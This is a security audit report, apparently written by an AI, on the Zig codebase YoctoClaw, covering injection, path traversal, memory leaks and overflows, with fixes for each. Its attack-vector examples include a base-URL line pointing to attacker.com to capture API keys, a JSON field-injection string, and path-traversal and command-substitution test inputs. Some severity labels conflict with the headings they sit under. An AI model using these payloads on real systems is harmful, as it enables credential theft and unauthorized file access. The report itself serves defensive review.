# YoctoClaw Security Audit Report
**Date:** 2026-02-16
**Auditor:** Claude (Automated Security Review)
**Scope:** All 16 src/*.zig files, build configuration, CI pipeline, documentation

---

## Executive Summary

**Total Issues Found:** 23
- **Critical:** 4 (injection vulnerabilities, memory safety)
- **High:** 5 (path traversal, memory leaks, overflow risks)
- **Medium:** 8 (edge cases, validation gaps, error handling)
- **Low:** 6 (documentation inconsistencies, code quality)

**Overall Assessment:** The codebase demonstrates good security-conscious design in many areas (path allowlists, sandbox mode, bounds checking for robotics). However, several **critical injection vulnerabilities** in IoT/robotics profiles and **memory safety issues** in parsing code require immediate attention before production use.

---

## 🔴 CRITICAL ISSUES

### C1. JSON Injection in IoT/Robotics Bridge Calls
**File:** `src/tools_iot.zig:77-78, 87, 99` and `src/tools_robotics.zig:115`
**Severity:** CRITICAL
**Type:** Command Injection / JSON Injection

**Description:**
Bridge calls construct JSON using direct string interpolation without escaping:

```zig
// tools_iot.zig:77-78
const bridge_json = std.fmt.allocPrint(allocator,
    \\{{"action":"mqtt_publish","topic":"{s}","payload":"{s}"}}
, .{ topic, payload }) catch ...;
```

If `topic` or `payload` contains `"` or `\`, the JSON becomes malformed or allows injection.

**Attack Vector:**
```
User prompt: "publish MQTT message with topic: foo","payload":"x","evil":"injected"
Result: {"action":"mqtt_publish","topic":"foo","payload":"x","evil":"injected","payload":"..."}
```

**Impact:**
- Arbitrary field injection into bridge protocol
- Potential command injection in bridge.py
- Bypasses rate limiting or bounds checks

**Fix:**
Use `json.writeEscaped()` or build JSON properly:
```zig
try w.writeAll("{\"action\":\"mqtt_publish\",\"topic\":\"");
try json.writeEscaped(w, topic);
try w.writeAll("\",\"payload\":\"");
try json.writeEscaped(w, payload);
try w.writeAll("\"}");
```

**Affected:**
- `tools_iot.zig:77, 87, 99`
- `tools_robotics.zig:115`
- `transport.zig:87, 103` (buildApiRpc, buildToolRpc already escape but manual builds don't)

---

### C2. Path Traversal Bypass via Alternative Encodings
**File:** `src/tools_coding.zig:66`
**Severity:** CRITICAL
**Type:** Path Traversal

**Description:**
Path validation only checks for `..` substring:

```zig
if (std.mem.indexOf(u8, path, "..") != null) return false;
```

**Bypass vectors:**
- URL encoding: `%2e%2e/`
- Multiple slashes: `..//sensitive_file`
- Symlink attacks (not checked)
- Null byte injection: `allowed_file\x00../../etc/passwd` (Zig strings are not null-terminated but C interop may be)

**Impact:**
Read/write arbitrary files outside cwd in non-sandbox mode.

**Fix:**
Use canonical path comparison:
```zig
const canonical = try std.fs.cwd().realpathAlloc(allocator, path);
defer allocator.free(canonical);
const cwd_real = try std.fs.cwd().realpathAlloc(allocator, ".");
defer allocator.free(cwd_real);
if (!std.mem.startsWith(u8, canonical, cwd_real)) return false;
```

---

### C3. Memory Leak in StreamParser Event Type
**File:** `src/stream.zig:60`
**Severity:** HIGH (Memory Safety)
**Type:** Memory Leak

**Description:**
`event_type` is allocated via `allocator.dupe()` on line 60 but never freed:

```zig
self.event_type = try self.allocator.dupe(u8, line[7..]);
```

On line 58, it's reassigned without freeing the previous value.

**Impact:**
Leaks ~10-30 bytes per SSE event. In a long streaming session (1000+ events), this accumulates to 10-30KB.

**Fix:**
```zig
if (self.event_type) |old| {
    self.allocator.free(old);
}
self.event_type = try self.allocator.dupe(u8, line[7..]);
```

Or use an arena allocator and free at message end.

---

### C4. Integer Overflow in Arena Allocator
**File:** `src/arena.zig:55`
**Severity:** HIGH (Memory Safety)
**Type:** Integer Overflow

**Description:**
No check for overflow when calculating allocation bounds:

```zig
if (aligned_offset + len > size) return null;
```

If `len` is very large (near usize max), `aligned_offset + len` can overflow and wrap around, bypassing the check.

**Attack Vector:**
Request allocation of `usize.max - 100`, wrapping to small positive number.

**Impact:**
Buffer overflow, memory corruption, potential code execution in embedded context.

**Fix:**
```zig
if (len > size or aligned_offset > size - len) return null;
```

---

## 🟠 HIGH SEVERITY ISSUES

### H1. Memory Leak in Config Loading
**File:** `src/config.zig:117, 125, 126`
**Severity:** HIGH
**Type:** Memory Leak

**Description:**
Config file parsing allocates strings but never frees them:

```zig
if (json.extractString(content, "model")) |m|
    config.model = allocator.dupe(u8, m) catch continue;
```

Config is loaded once but these strings persist for the program lifetime.

**Impact:**
Minor in short-lived CLI usage, but problematic in embedded REPL mode.

**Fix:**
Use an arena allocator for config or document that config strings are permanent.

---

### H2. Memory Leak in Robotics extractFloat
**File:** `src/tools_robotics.zig:45`
**Severity:** HIGH
**Type:** Memory Leak

**Description:**
Uses `std.heap.page_allocator` for temporary key pattern formatting, never freed:

```zig
const key_pattern = std.fmt.allocPrint(std.heap.page_allocator, "\"{s}\"", .{key}) catch return null;
```

Called for every robot command (10/sec rate limit = 600/min potential allocations).

**Impact:**
Unbounded memory growth in long-running robotics sessions.

**Fix:**
Pass allocator parameter or use stack buffer:
```zig
var buf: [128]u8 = undefined;
const key_pattern = std.fmt.bufPrint(&buf, "\"{s}\"", .{key}) catch return null;
```

---

### H3. Potential Integer Overflow in Context Token Counting
**File:** `src/context.zig:52-57`
**Severity:** MEDIUM
**Type:** Integer Overflow

**Description:**
`totalTokens()` returns u32, but sum can overflow with many large messages:

```zig
pub fn totalTokens(self: *const Context, messages: []const types.Message) u32 {
    var total: u32 = self.system_tokens;
    for (messages) |msg| {
        total += estimateMessageTokens(msg);  // Can overflow
    }
    return total;
}
```

**Impact:**
Incorrect context window management, truncation bypassed, API errors.

**Fix:**
Use u64 or saturating arithmetic:
```zig
total = @min(total + estimateMessageTokens(msg), std.math.maxInt(u32));
```

---

### H4. Unsafe Shell Execution in IoT device_info
**File:** `src/tools_iot.zig:189`
**Severity:** MEDIUM
**Type:** Command Injection (minor)

**Description:**
Runs shell command with potential for command injection if /proc/meminfo path is controllable:

```zig
.argv = &.{ "/bin/sh", "-c", "if [ -f /proc/meminfo ]; then head -3 /proc/meminfo | tr '\\n' '; '; else sysctl -n hw.memsize 2>/dev/null; fi" },
```

Hardcoded path is safe, but pattern is dangerous.

**Fix:**
Use Zig's file I/O instead of shell:
```zig
const file = std.fs.openFileAbsolute("/proc/meminfo", .{}) catch |_| { ... };
```

---

### H5. No Authentication/Encryption in BLE/Serial Transports
**File:** `src/ble.zig`, `src/serial.zig`
**Severity:** MEDIUM
**Type:** Cryptographic Weakness

**Description:**
BLE and Serial transports send API keys and tool results in plaintext over the wire.

**Impact:**
- API key theft via BLE sniffing (works through walls)
- MITM attacks on serial connections
- Exposure of sensitive tool results (file contents, command output)

**Fix:**
Implement TLS-style encryption or use platform BLE encryption (bonding).

---

## 🟡 MEDIUM SEVERITY ISSUES

### M1. JSON Parser Finds First Key at Any Depth
**File:** `src/json.zig:323-341`
**Severity:** MEDIUM
**Type:** Logic Error / Incorrect Parsing

**Description:**
`findKey()` returns first occurrence of key regardless of nesting level:

```zig
fn findKey(json: []const u8, key: []const u8) ?usize {
    // Search for "key" followed by :
    var pos: usize = 0;
    while (pos + key.len + 3 <= json.len) {
        if (json[pos] == '"' and ... std.mem.eql(u8, json[pos + 1 .. pos + 1 + key.len], key) ...)
```

**Impact:**
May extract wrong value if same key exists at multiple depths. Test at line 405-410 documents this as "known limitation".

**Risk:**
Low for Claude/OpenAI APIs (unique top-level keys), but fragile.

**Fix:**
Track brace depth or document limitation prominently.

---

### M2. extractInt Has No Overflow Validation
**File:** `src/json.zig:241`
**Severity:** MEDIUM
**Type:** Integer Overflow

**Description:**
Parses arbitrary JSON numbers as u32 without bounds checking:

```zig
return std.fmt.parseInt(u32, json[pos..end], 10) catch null;
```

If JSON contains "99999999999", `parseInt` returns error but caller may use default value incorrectly.

**Impact:**
Depends on usage. For `max_tokens`, could cause API errors.

**Fix:**
Validate range after parsing or use saturating behavior.

---

### M3. extractBraced Depth Counter Can Overflow
**File:** `src/json.zig:348-364`
**Severity:** LOW
**Type:** Integer Overflow

**Description:**
Depth tracking uses u32, but deeply nested JSON could overflow:

```zig
var depth: u32 = 0;
...
if (json[i] == open) depth += 1;
```

Extremely deep nesting (2^32 levels) is impractical, but technically possible.

**Impact:**
Parsing failure or incorrect extraction on malicious JSON.

**Fix:**
Limit depth to reasonable value (e.g., 256).

---

### M4. Binary File Detection Only Checks First 512 Bytes
**File:** `src/tools_coding.zig:295-297`
**Severity:** LOW
**Type:** Incomplete Validation

**Description:**
Search tool probes first 512 bytes for null bytes to detect binary files:

```zig
var probe: [512]u8 = undefined;
const probe_len = file.read(&probe) catch return;
for (probe[0..probe_len]) |b| { if (b == 0) return; }
```

Large text file with null byte at position 513+ will be searched.

**Impact:**
Minor: potential performance issue or garbled output on edge-case files.

**Fix:**
Document limitation or increase probe size to 4KB.

---

### M5. No Rate Limit Persistence Across Restarts
**File:** `src/tools_iot.zig:35-44`, `src/tools_robotics.zig:31-42`
**Severity:** LOW
**Type:** Rate Limit Bypass

**Description:**
Rate limiters use in-memory timestamps. Restarting the binary resets the limit.

**Impact:**
Attacker can bypass rate limits by restarting YoctoClaw.

**Fix:**
Persist timestamps to filesystem or accept this as documented behavior.

---

### M6. Loop Detection Only Checks Last 8 Calls
**File:** `src/agent.zig:29-33`
**Severity:** LOW
**Type:** Detection Evasion

**Description:**
Fixed-size ring buffer tracks only last 8 tool calls:

```zig
recent_tool_calls: [8][2]u64 = ...
```

Loop with period >8 won't be detected.

**Impact:**
Agent could get stuck in 9-step loop.

**Fix:**
Increase buffer size (16 or 32) or use time-based detection.

---

### M7. config.max_tokens Can Be Set Arbitrarily High
**File:** `src/config.zig:29`
**Severity:** LOW
**Type:** Resource Exhaustion

**Description:**
No validation on YOCTOCLAW_MAX_TOKENS environment variable:

```zig
config.max_tokens = std.fmt.parseInt(u32, mt, 10) catch config.max_tokens;
```

User can set to 4,294,967,295 (u32 max), causing massive API bills or OOM.

**Impact:**
Financial (API costs) or memory exhaustion.

**Fix:**
Clamp to reasonable max (e.g., 200,000):
```zig
config.max_tokens = @min(std.fmt.parseInt(u32, mt, 10) catch config.max_tokens, 200_000);
```

---

### M8. No Validation on Custom base_url
**File:** `src/config.zig:31`
**Severity:** MEDIUM
**Type:** SSRF / Data Exfiltration

**Description:**
User can set YOCTOCLAW_BASE_URL to arbitrary endpoint:

```zig
if (getEnv(allocator, "YOCTOCLAW_BASE_URL")) |url| config.base_url = url;
```

**Attack Vector:**
```
export YOCTOCLAW_BASE_URL=http://attacker.com/log
```

All API requests (including API key in headers) sent to attacker.

**Impact:**
- API key exfiltration
- SSRF to internal services
- Data leakage of prompts and tool results

**Fix:**
Document risk or validate URL scheme/domain against allowlist.

---

## 🟢 LOW SEVERITY / CODE QUALITY

### L1. Documentation Line Count Inconsistencies
**File:** `README.md:169-175`
**Severity:** LOW
**Type:** Documentation Accuracy

**Discrepancies:**
| File | README Claims | Actual | Diff |
|------|--------------|--------|------|
| tools.zig | 140 lines | 182 lines | +42 |
| tools_coding.zig | 280 lines | 410 lines | +130 |
| tools_iot.zig | 95 lines | 224 lines | +129 |
| tools_robotics.zig | 155 lines | 147 lines | -8 |

**Total LOC claim:** ~3,500 including tests
**Actual total:** 3,737 lines (all .zig files)

**Fix:**
Update README with actual counts (or note "approximate").

---

### L2. Inconsistent Error Message Formatting
**Files:** Various
**Severity:** LOW
**Type:** Code Quality

Some errors include path in message without sanitization:
```zig
// tools_coding.zig:158
const msg = std.fmt.allocPrint(allocator, "Cannot open '{s}': {}", .{ path, err }) ...
```

If `path` contains format specifiers or control characters, potential log injection.

**Fix:**
Sanitize paths in error messages or use structured logging.

---

### L3. apply_patch Uses Temporary File in /tmp
**File:** `src/tools_coding.zig:373`
**Severity:** LOW
**Type:** Insecure Temp File

**Description:**
Uses hardcoded `/tmp/yoctoclaw_patch.tmp` without mktemp:

```zig
const tmp_patch = "/tmp/yoctoclaw_patch.tmp";
```

**Risks:**
- Race condition: two instances overwrite each other
- Symlink attack: attacker creates symlink at /tmp/yoctoclaw_patch.tmp → sensitive file
- Predictable filename

**Fix:**
Use `std.fs.tmpDir()` with unique filename or `mkstemp()`.

---

### L4. TODO Comments Indicate Incomplete Features
**Files:** `src/serial.zig:130`, `src/ble.zig:37-40`
**Severity:** INFO
**Type:** Code Completeness

**TODOs:**
1. `serial.zig:130` - "Replace with termios ioctl for portability"
   Currently uses `stty` command (Linux/macOS only).

2. `ble.zig:37-40` - "Implement chunk reassembly for multi-packet responses"
   Large API responses >244 bytes not supported over real BLE.

**Impact:**
Limited platform support and BLE functionality.

**Fix:**
Document limitations in README (already partially done).

---

### L5. root.zig Contains Unused Template Code
**File:** `src/root.zig`
**Severity:** INFO
**Type:** Dead Code

Contains example code not used by the application:
```zig
pub fn bufferedPrint() !void { ... }
pub fn add(a: i32, b: i32) i32 { ... }
```

**Impact:**
None (unused code not compiled into binary).

**Fix:**
Remove or repurpose as library API if needed.

---

### L6. CI Binary Size Gate is 300KB but README Claims <180KB
**File:** `.github/workflows/test.yml:25` vs `README.md:22`
**Severity:** LOW
**Type:** Documentation Inconsistency

**CI limit:** 300KB (307,200 bytes)
**README claim:** "~150-180 KB"

**Impact:**
Confusion about actual size constraints.

**Fix:**
Align README with CI gate or tighten CI limit to 200KB.

---

## Edge Cases & Robustness

### E1. SSE Parser: No Timeout on Streaming
**File:** `src/stream.zig:48`
**Impact:** If API hangs mid-stream, client blocks forever.
**Fix:** Add timeout to HTTP client read operations.

---

### E2. Agent Loop: max_turns Only Prevents Infinite Loops
**File:** `src/agent.zig:67`
**Impact:** Long-running tasks (50+ turns) may hit limit prematurely.
**Fix:** Make limit configurable or warn before hitting limit.

---

### E3. JSON Unescape: Limited Escape Sequences
**File:** `src/json.zig:273-297`
**Issue:** Only handles `\n \r \t \\ \" \/`, not `\b \f \uXXXX`.
**Impact:** Unicode escape sequences in API responses not decoded.
**Fix:** Add \uXXXX support or document limitation.

---

## CI & Build Issues

### B1. No Static Analysis in CI
**File:** `.github/workflows/test.yml`
**Missing:** `zig fmt --check`, linting, security scanning.
**Fix:** Add format check and consider valgrind/ASAN builds.

---

### B2. Integration Tests Not in Version Control
**File:** `test/integration.sh` referenced but content not provided.
**Impact:** Cannot verify claims of "9 integration tests".
**Fix:** Ensure test file is committed.

---

## Recommendations

### Immediate Actions (Critical)
1. **Fix JSON injection** in IoT/robotics bridge calls (C1)
2. **Strengthen path traversal protection** with canonical path checks (C2)
3. **Fix memory leaks** in StreamParser and config loading (C3, H1)
4. **Add overflow protection** to arena allocator (C4)

### Short-term (High Priority)
5. Implement **TLS or authenticated encryption** for BLE/Serial (H5)
6. Fix **memory leak in robotics extractFloat** (H2)
7. Add **overflow protection** to context token counting (H3)
8. **Replace shell commands** with Zig file I/O in device_info (H4)

### Medium-term (Security Hardening)
9. Add **depth limits** to JSON parser (M3)
10. Validate **base_url** against allowlist (M8)
11. Implement **secure temp file** creation for patches (L3)
12. Add **rate limit persistence** across restarts (M5)

### Long-term (Code Quality)
13. Add **static analysis** to CI pipeline (B1)
14. Implement **streaming timeouts** (E1)
15. Support **Unicode escapes** in JSON parser (E3)
16. Update **documentation** to match actual code (L1, L6)

---

## Testing Recommendations

### Security Tests to Add
1. Path traversal: `../../etc/passwd`, `..//file`, `%2e%2e/`
2. JSON injection: topic=`foo","evil":"bar` in MQTT publish
3. Command injection: bash command with `$(malicious)`
4. Buffer overflow: allocate usize.max in arena
5. Integer overflow: set max_tokens to 4294967295
6. Memory leak: 10,000 streaming events, check RSS
7. Rate limit bypass: restart IoT agent and retry

### Fuzzing Targets
- `json.zig` extractString/extractObject/extractArray
- `stream.zig` SSE parser with malformed events
- `tools_coding.zig` search/list_files with glob patterns
- `transport.zig` RPC message chunking

---

## Conclusion

YoctoClaw demonstrates **good security design** in several areas:
- ✅ Sandbox mode with restricted bash execution
- ✅ Path allowlists in file operations
- ✅ Bounds checking for robotics commands
- ✅ Rate limiting for bridge calls
- ✅ Loop detection to prevent infinite agent cycles

However, the codebase has **critical vulnerabilities** that must be fixed before production use:
- ❌ JSON injection in IoT/robotics profiles (exploitable)
- ❌ Path traversal bypass (exploitable in non-sandbox mode)
- ❌ Memory leaks (DoS risk in long-running sessions)
- ❌ Integer overflow in arena allocator (memory corruption risk)

**Overall Security Grade:** C+ (70/100)
**Recommendation:** Address critical issues before public release. Add fuzzing and static analysis to CI.

---

**End of Report**
Generated: 2026-02-16
Files Audited: 16 source files, 3,737 LOC
Issues Found: 23 (4 critical, 5 high, 8 medium, 6 low)
